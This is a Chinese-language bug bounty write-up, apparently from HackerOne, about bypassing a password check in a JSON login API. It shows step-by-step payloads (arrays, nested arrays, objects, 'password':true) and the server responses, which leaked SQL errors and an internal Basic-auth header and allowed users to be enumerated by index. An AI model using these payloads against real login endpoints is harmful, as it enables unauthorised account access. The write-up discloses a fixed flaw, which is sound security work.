### 优化后的文本

#### 响应头和返回信息
```
Content-Length: 83 
ETag: W/”53-vxvZJPkaGgb/+r6gylAGG9yaeoE” 
Date: Thu, 11 Oct 2018 18:50:26 GMT 
Connection: close 
{"result":"User with login [bl4de] was not found.","resultCode":401,"type":"error"}
```

这个返回信息表明我的用户名被包含在方括号中。在JavaScript中，方括号通常表示数组，因此用户名看起来像数组中的一个元素。为了验证这一点，我发送了另一个payload——一个空的数组：

```json
{"username":[],"password":"secretpassword"}
```

服务器返回的信息如下：
```json
{"result":"User with login [] was not found.","resultCode":401,"type":"error"}
```

这表明服务器接受了一个空数组作为用户名。接下来，我尝试使用一个空对象作为用户名，看看会发生什么：

```json
{"username":{},"password":"secretpassword"}
```

服务器返回的响应证实了我的猜测（它试图调用{}.replace，但JavaScript的对象没有replace方法）：

```json
{"result":"val.replace is not a function","resultCode":500,"type":"error"}
```

这类似于以下JavaScript代码的错误：
```javascript
let val = {};
val.replace();
// Uncaught TypeError: val.replace is not a function
```

#### 利用漏洞
确认一个错误是一回事，但成功利用它是另一回事。我开始思考服务器端代码是如何运行的，并尝试触发不同的错误。嵌套数组 `[[]]` 看起来很有希望：

```json
{"username":[[]],"password":"secretpassword"}
```

服务器的响应超出了我的预期：

```json
{"result":"ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR `Person`.`REDACTED_ID` IN ()) LIMIT 1' at line 1","resultCode":409,"type":"error"}
```

看到这样的错误信息，赏金猎人会想到SQL注入。首先，我需要弄清楚如何在查询中使用用户名来构造正确的payload。我假设用户名被当作数组元素处理，于是我发送了一个请求，其中用户名是数组的第一个元素 `[0]`：

```json
{"username":[0],"password":"secretpassword"}
```

应用返回了一个不同的错误信息：

```json
{"result":"User super.adm, Request {\"port\":21110,\"path\":\"/REDACTED?ApiKey=REDACTED\",\"headers\":{\"Authorization\":\"Basic c3VwZXIuYWRtOnNlY3JldHBhc3N3b3Jk\"}, \"host\":\"api-global.REDACTED\"}, Response {\"faultcode\":\"ERR_ACCESS_DENIED\",\"faultstring\":\"User credentials are wrong or missing.\", \"correlationId\":\"Id-d5a9bf5b7ad73e0042191000924e3ca9\"}","resultCode":401,"type":"error"}
```

经过快速分析，我发现可以使用ID为0的用户（或数据结构中索引为0的用户）。我发送了另一个请求，这次内部服务器监听的端口是21110。显然，请求未通过验证，原因是密码错误（Authorization头中包含Base64编码的`super.adm:secretpassword`，这意味着应用使用了下标为0的用户，并且密码来自我最初的请求）。

接下来，我尝试枚举数据库中的其他用户，发现可以传递任意数量的下标作为登录请求中的用户名，它们会被放在查询语句的IN()中：

```json
{"username":[0,1,2,30,50,100],"password":"secretpassword"}
```

无论何时发现有效的下标，请求都会返回一个有效用户。但我使用的密码总是错误的，所以我还没有完全绕过身份验证。下一个挑战是找到一种方法绕过密码验证。

我尝试了最简单的方式：布尔值 `false`：

```json
{"username":[0],"password":false}
```

服务器返回了不同的内容：

```json
{"result":"Please provide credentials","resultCode":500,"type":"error"}
```

这表明用户名或密码缺失。当我提供用户名时，服务器会验证密码，而 `"password": false` 意味着密码不存在。发送 `null` 和 `0`（这些值在JavaScript中都被视为 `false`）也会导致相同的错误。

#### 最终PoC
如果密码为 `false` 会导致失败，那么将密码设为 `true` 是否可行？

```json
{"username":[0],"password":true}
```

使用数组的第一个元素 `[0]` 作为用户名并将 `true` 作为密码，我可以成功绕过用户验证：

```json
{"result":"Given pin is not valid.","resultCode":401,"type":"error"}
```

**免责声明**：这个绕过并不完全，并且也不允许我登录到应用，因为验证过程还涉及第三个因素：PIN码，它应在登录后输入。无论如何，这个身份验证绕过的漏洞是有效的，并且现在已经被修复。

利用SQL注入是不可能的，因为输入的用户名和密码都经过正则表达式的检查，当payload包含不被允许的特殊字符时，服务器会返回语法错误。

#### 致谢
感谢该公司及其安全团队的支持，以及HackerOne漏洞赏金计划提供的机会，使我能够撰写这篇关于漏洞的文章。特别感谢我的安全小组成员为这份报告提供的支持与反馈。